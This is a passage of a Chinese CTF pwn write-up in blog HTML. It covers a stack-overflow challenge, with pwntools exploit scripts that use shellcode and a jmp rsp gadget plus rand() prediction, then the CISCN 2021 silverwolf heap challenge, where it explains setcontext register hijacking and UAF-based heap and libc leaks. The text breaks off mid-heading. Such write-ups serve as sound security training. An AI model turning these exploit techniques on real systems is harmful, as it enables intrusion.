class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your door&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">haha</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中又有个jmp rsp，同时栈上rwx，显然便是在栈上构造orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./RANDOM&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">orwshell=<span class="string">b&quot;\x48\x89\xc7\x48\x89\xe6\xba\x00\x01\x00\x00\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xe6\x6a\x01\x58\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23245</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="comment"># add_rsp_ret=0x00000000004006aa   # add rsp, 8 ; ret</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">shellcode = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sub_rsp_call_rsp=<span class="string">b&quot;\x48\x83\xec\x30\xff\xd4&quot;</span></span><br><span class="line">jmp_rsp=<span class="number">0x040094E</span></span><br><span class="line">pal= shellcode +p64(jmp_rsp)+sub_rsp_call_rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    p=run()</span><br><span class="line">    sla(<span class="string">b&#x27;please input a guess num:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.001</span>)</span><br><span class="line">    data=r(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;good&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        sla(<span class="string">b&#x27;your door&#x27;</span>,pal)</span><br><span class="line">        irt()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p>我是直接爆破打的，用shellcraft打通了</p><p>但是我看网上师傅的用了一个新奇的手法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnModules <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./RANDOM&#x27;</span></span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 28512)</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">rand_result = libc.rand() % <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rand_result)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(rand_result))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用libc.so.6来获得随机数然后直接输出，很好的手法，让我的大脑无限旋转，学到了</p><h1 id="CISCN-2021-初赛-silverwolf"><a href="#CISCN-2021-初赛-silverwolf" class="headerlink" title="[CISCN 2021 初赛]silverwolf"></a>[CISCN 2021 初赛]silverwolf</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258824.png" alt="image-20240514232649821"></p><p>满保护，坐起来打</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258825.png" alt="image-20240514233916232"></p><p>又是orw，累了</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258826.png" alt="image-20240514234039441"></p><p>还因为orw设置规则把堆弄得乱七八糟，真糟心:face_with_thermometer:</p><h2 id="2-27打setcontext劫持流"><a href="#2-27打setcontext劫持流" class="headerlink" title="2.27打setcontext劫持流"></a>2.27打setcontext劫持流</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100i 0x7ffff7a34050</span><br><span class="line">   0x7ffff7a34050 &lt;setcontext&gt;:push   rdi</span><br><span class="line">   0x7ffff7a34051 &lt;setcontext+1&gt;:lea    rsi,<span class="section">[rdi+0x128]</span></span><br><span class="line">   0x7ffff7a34058 &lt;setcontext+8&gt;:xor    edx,edx</span><br><span class="line">   0x7ffff7a3405a &lt;setcontext+10&gt;:mov    edi,0x2</span><br><span class="line">   0x7ffff7a3405f &lt;setcontext+15&gt;:mov    r10d,0x8</span><br><span class="line">   0x7ffff7a34065 &lt;setcontext+21&gt;:mov    eax,0xe</span><br><span class="line">   0x7ffff7a3406a &lt;setcontext+26&gt;:syscall </span><br><span class="line">   0x7ffff7a3406c &lt;setcontext+28&gt;:pop    rdi</span><br><span class="line">   0x7ffff7a3406d &lt;setcontext+29&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7a34073 &lt;setcontext+35&gt;:jae    0x7ffff7a340d0 &lt;setcontext+128&gt;</span><br><span class="line">   0x7ffff7a34075 &lt;setcontext+37&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xe0]</span></span><br><span class="line">   0x7ffff7a3407c &lt;setcontext+44&gt;:fldenv <span class="section">[rcx]</span></span><br><span class="line">   0x7ffff7a3407e &lt;setcontext+46&gt;:ldmxcsr DWORD PTR <span class="section">[rdi+0x1c0]</span></span><br><span class="line">   0x7ffff7a34085 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR <span class="section">[rdi+0xa0]</span></span><br><span class="line">   0x7ffff7a3408c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR <span class="section">[rdi+0x80]</span></span><br><span class="line">   0x7ffff7a34093 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR <span class="section">[rdi+0x78]</span></span><br><span class="line">   0x7ffff7a34097 &lt;setcontext+71&gt;:mov    r12,QWORD PTR <span class="section">[rdi+0x48]</span></span><br><span class="line">   0x7ffff7a3409b &lt;setcontext+75&gt;:mov    r13,QWORD PTR <span class="section">[rdi+0x50]</span></span><br><span class="line">   0x7ffff7a3409f &lt;setcontext+79&gt;:mov    r14,QWORD PTR <span class="section">[rdi+0x58]</span></span><br><span class="line">   0x7ffff7a340a3 &lt;setcontext+83&gt;:mov    r15,QWORD PTR <span class="section">[rdi+0x60]</span></span><br><span class="line">   0x7ffff7a340a7 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xa8]</span></span><br><span class="line">   0x7ffff7a340ae &lt;setcontext+94&gt;:push   rcx</span><br><span class="line">   0x7ffff7a340af &lt;setcontext+95&gt;:mov    rsi,QWORD PTR <span class="section">[rdi+0x70]</span></span><br><span class="line">   0x7ffff7a340b3 &lt;setcontext+99&gt;:mov    rdx,QWORD PTR <span class="section">[rdi+0x88]</span></span><br><span class="line">   0x7ffff7a340ba &lt;setcontext+106&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0x98]</span></span><br><span class="line">   0x7ffff7a340c1 &lt;setcontext+113&gt;:mov    r8,QWORD PTR <span class="section">[rdi+0x28]</span></span><br><span class="line">   0x7ffff7a340c5 &lt;setcontext+117&gt;:mov    r9,QWORD PTR <span class="section">[rdi+0x30]</span></span><br><span class="line">   0x7ffff7a340c9 &lt;setcontext+121&gt;:mov    rdi,QWORD PTR <span class="section">[rdi+0x68]</span></span><br><span class="line">   0x7ffff7a340cd &lt;setcontext+125&gt;:xor    eax,eax</span><br><span class="line">   0x7ffff7a340cf &lt;setcontext+127&gt;:ret    </span><br></pre></td></tr></table></figure><p>通过gdb来看setcontext，会发现从+53开始可以控制几乎所有的寄存器，除了rax会变成0</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a34085 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR <span class="section">[rdi+0xa0]</span> //或许可以栈迁移</span><br><span class="line">0x7ffff7a3408c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR <span class="section">[rdi+0x80]</span></span><br><span class="line">0x7ffff7a34093 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR <span class="section">[rdi+0x78]</span></span><br><span class="line">0x7ffff7a34097 &lt;setcontext+71&gt;:mov    r12,QWORD PTR <span class="section">[rdi+0x48]</span></span><br><span class="line">0x7ffff7a3409b &lt;setcontext+75&gt;:mov    r13,QWORD PTR <span class="section">[rdi+0x50]</span></span><br><span class="line">0x7ffff7a3409f &lt;setcontext+79&gt;:mov    r14,QWORD PTR <span class="section">[rdi+0x58]</span></span><br><span class="line">0x7ffff7a340a3 &lt;setcontext+83&gt;:mov    r15,QWORD PTR <span class="section">[rdi+0x60]</span></span><br><span class="line">0x7ffff7a340a7 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0xa8]</span></span><br><span class="line">0x7ffff7a340ae &lt;setcontext+94&gt;:push   rcx</span><br><span class="line">0x7ffff7a340af &lt;setcontext+95&gt;:mov    rsi,QWORD PTR <span class="section">[rdi+0x70]</span></span><br><span class="line">0x7ffff7a340b3 &lt;setcontext+99&gt;:mov    rdx,QWORD PTR <span class="section">[rdi+0x88]</span></span><br><span class="line">0x7ffff7a340ba &lt;setcontext+106&gt;:mov    rcx,QWORD PTR <span class="section">[rdi+0x98]</span></span><br><span class="line">0x7ffff7a340c1 &lt;setcontext+113&gt;:mov    r8,QWORD PTR <span class="section">[rdi+0x28]</span></span><br><span class="line">0x7ffff7a340c5 &lt;setcontext+117&gt;:mov    r9,QWORD PTR <span class="section">[rdi+0x30]</span></span><br><span class="line">0x7ffff7a340c9 &lt;setcontext+121&gt;:mov    rdi,QWORD PTR <span class="section">[rdi+0x68]</span></span><br><span class="line">0x7ffff7a340cd &lt;setcontext+125&gt;:xor    eax,eax</span><br><span class="line">0x7ffff7a340cf &lt;setcontext+127&gt;:ret    </span><br></pre></td></tr></table></figure><p>而rdi是第一个参数，因此我们可以将setcontext+53放入<code>_malloc_hook</code>或者<code>_free_hook</code>，malloc或free一个堆块，此时rdi便是堆块的内容指针，因此只要提前在堆块里布置对应的寄存器值，就可以控制基本所有寄存器的值，还可以push一个值</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见的菜单堆题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;size);                 <span class="comment">// =0</span></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;size);</span><br><span class="line">    v1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        global_size = v1;</span><br><span class="line">        malloc_ptr_0 = v2;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中size&lt;&#x3D;0x78，同时只能同时在内存存在一个malloc内存地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( malloc_ptr_0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = malloc_ptr_0;</span><br><span class="line">      <span class="keyword">if</span> ( global_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="type">char</span> *)malloc_ptr_0 + global_size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;                                <span class="comment">// off-by-null</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该是有一个off-by-one的，但是没有用上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; malloc_ptr_0 )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)malloc_ptr_0);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; malloc_ptr_0 )</span><br><span class="line">    <span class="built_in">free</span>(malloc_ptr_0);                         <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然uaf</p><p>首先分为三步</p><h2 id="一：泄露heap基址"><a href="#一：泄露heap基址" class="headerlink" title="一：泄露heap基址"></a>一：泄露heap基址</h2><p>​因为本题有一个沙箱，而该沙箱是通过大量的堆来实现的，因此内存中本身就存在大量的heap</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258827.png" alt="image-20240515234643361"></p><p>因此只要申请并释放一个0x78就可以泄露heap基址</p><h2 id="二：泄露libc基址"><a href="#二：泄露libc基址" class="headerlink" title="二：泄露libc基址"></a>二：泄露libc基址</h2><p>这题泄露libc基址十分巧妙，它首先是通过将下一个heap申请到tcache_perthread_struct结构体上，因为该结构体是0x250大小的，而tcache也包含了这个大小，因此劫持这个结构体，将该0x250大小的heap的数量拉满，这样再次释放就将本heap释放到unsortedbin里，再show一下就有libc基址了</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258828.png" alt="image-20240515235042186"></p><h2 id="三：劫持setcontext"><a href="#三：劫持setcontext" class="headerlink" 